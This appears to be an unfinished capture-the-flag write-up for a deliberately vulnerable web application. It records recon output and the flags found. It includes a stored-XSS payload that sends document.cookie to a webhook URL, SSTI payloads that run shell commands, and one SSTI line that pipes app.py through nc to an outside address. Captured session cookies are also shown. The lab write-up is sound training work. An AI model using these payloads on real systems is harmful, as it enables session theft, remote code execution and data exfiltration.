---
cssclasses:
  - jbm-note
Date: 2026-06-06
---

# Web Challenge

| **Target** :LiTarget:              | *100.31.117.193*  |
| ---------------------------------- | ----------------- |
| Date :LiCalendar:                  | 31/5/2026         |
| Main attack type                   | ...               |
| Secondary attack type              | ...               |
| Tools :LiToolCase: :               | JADX, GenY Motion |
| Criticality :RiAlarmWarningLine: : | **...**           |

---
# **RESULTS**
---
## Flags found
1. First flag - Passive Recon
	- *FLAG{p4ss1v3_r3c0n_m3t4d4t4_l34k}*
2. Second flag - Robots.txt
	- *FLAG{r3c0n_m4st3r_r0b0ts_txt}*
3. Third flag - IDOR
	- *FLAG{1d0r_ch4mp_acc3ss_d3n13d_lol}*
4. Fourth flag -  Brocken access control
	- *FLAG{brok3n_4cc3ss_c0ntr0l_0wn3d}*
5. Fifth flag - SQLI password bypass
	- *FLAG{sql1_4uth_byp4ss_pwn3d}*
6. Sixth flag - File upload
	- *FLAG{f1l3_upl04d_w3bsh3ll_dr0pp3d}*
7. Seventh flag - Cookie hijacking
	- *FLAG{x55_st0r3d_c00k13_st0l3n};*
8. Eighth flag - Template injection
	- *FLAG{5st1_t3mpl4t3_1nj3ct10n_rce}*
9. Ninth flag - BONUS
	- *FLAG{s3c0nd_0rd3r_sql1_d4ng3r0us}*
10. Tenth flag - RCE
	- *FLAG{rce_full_pwn_y0u_0wn_th3_b0x}*

---
# Preparation
---
## Tools
1. **Basic tools**
	- On :SiKalilinux: *Kali Linux*
2. **Burpsuite**
	- Community edition

## Payloads
### XSS
```html
<img src=x onerror="fetch('https://webhook.site/72cc3984-cd94-44d1-8e1c-36bee4de7237?c='+document.cookie)"/>
```
### SSTI
```python
{{self.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('whoami').read() }}
```
---
# Initial investigation/enumeration
---
## **Enumeration**
### NMAP results
#### Ports
```bash
sudo nmap -sS -p- 100.31.117.193
```
```
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
```
#### Versions
```bash
sudo nmap -sS -sV 100.31.117.193
```
```
22/tcp   open  ssh     OpenSSH 8.7 (protocol 2.0)
80/tcp   open  http    nginx
3000/tcp open  ppp?
```
### GOBUSTER results
```bash
gobuster dir -u http://100.31.117.193 -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,html,js,pdf.txt
```
```
admin                (Status: 403) [Size: 1416]
backup               (Status: 403) [Size: 1465]
dashboard            (Status: 302) [Size: 199] [--> /login]
feedback             (Status: 302) [Size: 199] [--> /login]
login                (Status: 200) [Size: 1783]
logout               (Status: 302) [Size: 189] [--> /]
profile              (Status: 302) [Size: 199] [--> /login]
register             (Status: 200) [Size: 1694]
robots.txt           (Status: 200) [Size: 191]
upload               (Status: 302) [Size: 199] [--> /login]
```

**`it-support@vulncorp.internal`**
`testUser`
`Tester@testers.eu`
`TestPass`

## **Vulnerability scanning**
Application was already made to be intentionally vulnerable.

---
# Exploiting and  Investigation
---
## Enumeration
### First flag
The first flag is shown when doing passive recon, it can be viewed by either using burp-suite or using `curl` with headers. It is stored in the `X-Debug-Token`.

### Second flag
Enumerating through the site further, and checking the `/robots.txt` endpoint returns the second flag.
```
User-agent: *
Disallow: /admin
Disallow: /api
Disallow: /backup
Disallow: /internal
# FLAG: FLAG{r3c0n_m4st3r_r0b0ts_txt}
# Note: removed old /secret-panel route, but /admin-old still exists
```
### Third flag

### Fourth flag
`http://100.31.117.193/document/DOC-001`

```
%3DFLAG%7Bx55_st0r3d_c00k13_st0l3n%7D%3B%20session%3D.eJyrVkosKCjKL0tNUbIqKSpN1VEqys9JVbJSSkzJzcxT0lEqLU4tis8EyhpC2HmJuQjpWgC3KBVe.aiQclg.z99ORyMrzQvHwxP6sW5SxZFxc4M
```
```
.eJyrVkosKCjKL0tNUbIqKSpN1VEqys9JVbJSSkzJzcxT0lEqLU4tis8EyhpC2HmJuQjpWgC3KBVe.aiQesw.v940yot8dHBt2ET2ITiUQbhQUUQ
```
```
.eJyrVkosKCjKL0tNUbIqKSpN1VEqys9JVbJSKi1OLVLSUSouzMmMT8tJTAcKufk4ulcDBQzjTUpLMuKTKgtMiovjC8rzjFNqgUpBOuIzgeYYQdh5ibkggxJzMpNTlWoBjbckMA.aiQcLw.MJ-3wHP9jf-n0hAIRU2iz4RPGQc
```

`Welcome Admin`

```
admin_session=FLAG{x55_st0r3d_c00k13_st0l3n}; session=.eJyrVkosKCjKL0tNUbIqKSpN1VEqys9JVbJSSkzJzcxT0lEqLU4tis8EyhpC2HmJuQjpWgC3KBVe.aiQgHA.i6hK5xWe0vvHpqmkOfgAtWKkaXQ
```

```
POST /upload HTTP/1.1
Host: 100.31.117.193
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundarycc73c8749132de51856e7bbf0868da07
Content-Length: 15462
Origin: http://100.31.117.193
Connection: keep-alive
Referer: http://100.31.117.193/upload
Cookie: session=.eJyrVkosKCjKL0tNUbIqKSpN1VEqys9JVbJSKi1OLVLSUSouzMmMT8tJTAcKufk4ulcDBQzjTUpLMuKTKgtMiovjC8rzjFNqgUpBOuIzgeYYQdh5ibkggxJzMpNTlWoBjbckMA.aiQcLw.MJ-3wHP9jf-n0hAIRU2iz4RPGQc
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundarycc73c8749132de51856e7bbf0868da07
Content-Disposition: form-data; name="file"; filename="ADWA-FLAG-IMG.jpg"
Content-Type: image/jpeg

<?php

?>

------geckoformboundarycc73c8749132de51856e7bbf0868da07--
```

```
{{ cycler.__init__.__globals__.os.popen('whoami').read() }}
```
`ssti_flag.txt`
**`FLAG{5st1_t3mpl4t3_1nj3ct10n_rce}`**
`{{ cycler.__init__.__globals__.os.popen('cat app.py').read() }}`
```python
{{ cycler.__init__.__globals__.os.popen('tar -czf - app.py | nc 10.0.2.15 1234').read() }}
```
